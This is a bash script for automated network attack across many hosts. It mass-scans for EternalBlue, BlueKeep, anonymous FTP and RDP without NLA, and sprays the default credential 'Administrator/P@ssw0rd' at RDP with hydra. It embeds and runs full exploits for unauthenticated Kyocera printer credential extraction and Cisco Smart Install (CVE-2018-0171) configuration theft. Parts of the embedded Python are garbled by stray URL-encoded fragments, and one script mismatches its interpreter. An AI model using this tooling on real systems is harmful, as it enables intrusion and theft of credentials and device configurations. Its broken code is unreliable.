#!/bin/bash

for x in 21 22 23 53 80 139 161 443 3306 3389 2049 6379 1433 1521 445 8080 9091 4786
do
    cat $1 | grep Host: |grep $x | cut -d ' ' -f 2 > port_$x.txt
done

echo "---------------Eternal Blue-------------------------------  "
echo "------------------------------------------------------------"
msfconsole -q -x "use auxiliary/scanner/smb/smb_ms17_010;set threads 200;set rhost file://port_445.txt;run;exit;" | grep "Host is likely VULNERABLE to MS17-010! " | cut -d ' ' -f 2 | tee eternal_blue
#AnonymousLogin

echo "---------------Anonymous Login-------------------------------  "
echo "------------------------------------------------------------"

msfconsole -q -x "use auxiliary/scanner/ftp/anonymous;set threads 200;set rhost file://port_21.txt;run;exit;"|grep "Anonymous READ" |cut -d  ' ' -f 2 | tee anonymous_login

#BlueKeep
echo "---------------Blue Keep-------------------------------  "
echo "------------------------------------------------------------"
msfconsole -q -x "use auxiliary/scanner/rdp/cve_2019_0708_bluekeep;set threads 200;set rhost file://port_3389.txt;run;exit;"| grep "The target is vulnerable"|cut -d " " -f 2| tee blue_keep

#RDP
 
echo "---------------NLA-------------------------------  "
echo "------------------------------------------------------------"
msfconsole -q -x "use auxiliary/scanner/rdp/rdp_scanner;set threads 200;set rhost file://port_3389.txt;run;exit;" | grep -a "Requires NLA: No" | cut -d " "  -f 2 | cut -d ":"  -f 1 |tee nla
##cat nla | grep -a "Requires NLA: No" | cut -d " "  -f 2 | tee nla

echo "----------------------Default Credentials --------------------------------------"
hydra -l Administrator -p 'P@ssw0rd' -M nla rdp -o rdp_default_credentials.txt 
#ncrack -user  Administrator -pass P@ssw0rd -p rdp -iL port_3389.txt -v
 
 
#HTTP METHODS
 
echo "---------------HTTP Methods-------------------------------  "
echo "------------------------------------------------------------"
 
msfconsole -q -x "use auxiliary/scanner/http/options;set threads 200;set rhost file://port_80.txt;run;exit;"|grep "allow" |cut -d " " -f 2 | tee http_methods
echo "---------------HTTPS Methods-------------------------------  "
echo "------------------------------------------------------------"
msfconsole -q -x "use auxiliary/scanner/http/options;set threads 200;set rport 443;set rhost file://port_443.txt;run;exit;"|grep "allow" |cut -d " " -f 2 | tee https_methods
#Kyocera CREDENTIAL LEAKAGE
for addr in $(cat port_9091.txt);do python3 /root/Documents/kyo_exploit.py $addr | tee $addr &done
#SSL 
echo "---------------SSL SCAN-------------------------------  "
echo "------------------------------------------------------------"
sslscan --ssl2 --ssl3 --tls1 --tls11 --targets=port_443.txt > port_443_ssl_report.txt
cat port_443_ssl_report.txt | grep Connected |cut -d " " -f 3 | tee sort_ssl_ips
#SSL 
echo "---------------kyo test -------------------------------  "
echo "------------------------------------------------------------"




########################################################################################################
cat <<EOF > kyocera_exploit.py
#!/usr/bin/python

"""
Kyocera printer exploit
Extracts sensitive data stored in the printer address book, unauthenticated, including:
    *email addresses
    *SMB file share credentials used to write scan jobs to a network fileshare
    *FTP credentials

Author: Aaron Herndon, @ac3lives (Rapid7)
Date: 11/12/2021
Tested versions: 
    * ECOSYS M2640idw
    *  TASKalfa 406ci
    * 

Usage: 
python3 getKyoceraCreds.py printerip
"""
import requests
import xmltodict
import warnings
import sys
import time
warnings.filterwarnings("ignore")
 
url = "https://{}:9091/ws/km-wsdl/setting/address_book".format(sys.argv[1])
 
headers = {'content-type': 'application/soap+xml'}
 
session = requests.session()
session.trust_env = False
 
# Submit an unauthenticated request to tell the printer that a new address book object creation is required
body = """<?xml version="1.0" encoding="utf-8"?><SOAP-ENV:Envelope xmlns:SOAP-ENV="http://www.w3.org/2003/05/soap-envelope" (http://www.w3.org/2003/05/soap-envelope%22) xmlns:SOAP-ENC="http://www.w3.org/2003/05/soap-encoding" (http://www.w3.org/2003/05/soap-encoding%22) xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" (http://www.w3.org/2001/XMLSchema-instance%22) xmlns:xsd="http://www.w3.org/2001/XMLSchema" (http://www.w3.org/2001/XMLSchema%22) xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing" (http://schemas.xmlsoap.org/ws/2004/08/addressing%22) xmlns:xop="http://www.w3.org/2004/08/xop/include" (http://www.w3.org/2004/08/xop/include%22) xmlns:ns1="http://www.kyoceramita.com/ws/km-wsdl/setting/address_book"><SOAP-ENV:Header><wsa:Action (http://www.kyoceramita.com/ws/km-wsdl/setting/address_book%2522%3E%3CSOAP-ENV:Header%3E%3Cwsa:Action) SOAP-ENV:mustUnderstand="true">http://www.kyoceramita.com/ws/km-wsdl/setting/address_book/create_personal_address_enumeration</wsa:Action></SOAP-ENV:Header><SOAP-ENV:Body><ns1:create_personal_address_enumerationRequest><ns1:number>25</ns1:number></ns1:create_personal_address_enumerationRequest></SOAP-ENV:Body></SOAP-ENV:Envelope>""" (http://www.kyoceramita.com/ws/km-wsdl/setting/address_book/create_personal_address_enumeration%3C/wsa:Action%3E%3C/SOAP-ENV:Header%3E%3CSOAP-ENV:Body%3E%3Cns1:create_personal_address_enumerationRequest%3E%3Cns1:number%3E25%3C/ns1:number%3E%3C/ns1:create_personal_address_enumerationRequest%3E%3C/SOAP-ENV:Body%3E%3C/SOAP-ENV:Envelope%3E%2522%2522%2522)
response = session.post(url,data=body,headers=headers, verify=False)
 
strResponse = response.content.decode('utf-8')
 
#print(strResponse)
parsed = xmltodict.parse(strResponse)
 
# The SOAP request returns XML with an object ID as an integer stored in kmaddrbook:enumeration. We need this object ID to request the data from the printer.
getNumber = parsed['SOAP-ENV:Envelope']['SOAP-ENV:Body']['kmaddrbook:create_personal_address_enumerationResponse']['kmaddrbook:enumeration']
 
body = """<?xml version="1.0" encoding="utf-8"?><SOAP-ENV:Envelope xmlns:SOAP-ENV="http://www.w3.org/2003/05/soap-envelope" (http://www.w3.org/2003/05/soap-envelope%22) xmlns:SOAP-ENC="http://www.w3.org/2003/05/soap-encoding" (http://www.w3.org/2003/05/soap-encoding%22) xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" (http://www.w3.org/2001/XMLSchema-instance%22) xmlns:xsd="http://www.w3.org/2001/XMLSchema" (http://www.w3.org/2001/XMLSchema%22) xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing" (http://schemas.xmlsoap.org/ws/2004/08/addressing%22) xmlns:xop="http://www.w3.org/2004/08/xop/include" (http://www.w3.org/2004/08/xop/include%22)
 xmlns:ns1="
http://www.kyoceramita.com/ws/km-wsdl/setting/address_book"><SOAP-ENV:Header><wsa:Action (http://www.kyoceramita.com/ws/km-wsdl/setting/address_book%2522%3E%3CSOAP-ENV:Header%3E%3Cwsa:Action)
 SOAP-ENV:mustUnderstand="true">
http://www.kyoceramita.com/ws/km-wsdl/setting/address_book/get_personal_address_list</wsa:Action></SOAP-ENV:Header><SOAP-ENV:Body><ns1:get_personal_address_listRequest><ns1:enumeration>{}</ns1:enumeration></ns1:get_personal_address_listRequest></SOAP-ENV:Body></SOAP-ENV:Envelope>""".format(getNumber) (http://www.kyoceramita.com/ws/km-wsdl/setting/address_book/get_personal_address_list%3C/wsa:Action%3E%3C/SOAP-ENV:Header%3E%3CSOAP-ENV:Body%3E%3Cns1:get_personal_address_listRequest%3E%3Cns1:enumeration%3E%257B%257D%3C/ns1:enumeration%3E%3C/ns1:get_personal_address_listRequest%3E%3C/SOAP-ENV:Body%3E%3C/SOAP-ENV:Envelope%3E%2522%2522%2522.format(getNumber))

 
print("Obtained address book object: {}. Waiting for book to populate".format(getNumber))
 
time.sleep(5)
 
print("Submitting request to retrieve the address book object...")
 
response = session.post(url,data=body,headers=headers, verify=False)
 
strResponse = response.content.decode('utf-8')
 
#rint(strResponse)
parsed = xmltodict.parse(strResponse)
 
print(parsed['SOAP-ENV:Envelope']['SOAP-ENV:Body'])
 
print("\n\nObtained address book. Review the above response for credentials in objects such as 'login_password', 'login_name'")

EOF

chmod 755 kyocera_exploit.py

#Kyocera CREDENTIAL LEAKAGE
for addr in $(cat port_9091.txt);do python3 /root/Documents/kyocera_exploit.py $addr | tee $addr &done

#########################################################################################################################################
echo "---------------cisco_smart_install_test-------------------------------  "
echo "------------------------------------------------------------"

cat <<EOF > smart_install_exploit.py
#!/usr/bin/python
# C. Papathanasiou (2018)
# Cisco Smart Install Exploit# CVE-2018-0171

import socket 
import sys 
import time 
import os
import tftpy 
string = "00000001000000010000000A00000050FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF555CCA6800000000000000000000000000000000FFFFFFFF00000001".decode("hex") 
string2 = "000000010000000100000008000001680001001400000001000000000021D863A560000000020154636F6E66696775726520746674702D736572766572206E7672616D3A737461727475702D636F6E666967000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000".decode("hex") 
ip = sys.argv[1]
port = 4786
srvsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
srvsock.settimeout(3)  
srvsock.connect((ip, port)) 
print "sending packets" 
srvsock.sendall(string) 
srvsock.sendall(string2) 
srvsock.close() 
print "sleeping 5 seconds" 
time.sleep(5) 
print "downloading config" 
filename = "%s-config" % sys.argv[1] 
try: 
    client = tftpy.TftpClient(sys.argv[1], 69) 
    client.download('startup-config', filename) 
    print "config downloaded!" 
except: 
    print "failed"

EOF

chmod 755 smart_install_exploit.py

for addr in $(cat port_4786.txt);do python3 /root/Documents/smart_install_exploit.py $addr | tee $addr &done